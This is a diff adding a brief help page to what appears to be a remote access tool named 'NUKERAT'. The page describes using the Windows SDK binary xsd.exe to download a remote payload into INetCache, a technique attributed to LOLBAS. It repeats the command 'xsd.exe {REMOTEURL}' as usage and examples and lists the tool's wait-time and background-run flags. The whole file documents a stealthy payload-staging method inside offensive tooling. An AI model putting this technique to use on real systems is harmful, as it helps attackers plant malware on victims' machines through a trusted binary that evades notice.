@@ -1,0 +1,17 @@
+ABOUT
+    XML Schema Definition Tool included with the Windows Software
+    Development Kit (SDK). LOLBAS documents remote payload download into
+    INetCache.
+
+USAGE:
+    xsd.exe {REMOTEURL}
+
+EXAMPLES:
+    xsd.exe {REMOTEURL}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    xsd.exe {REMOTEURL}
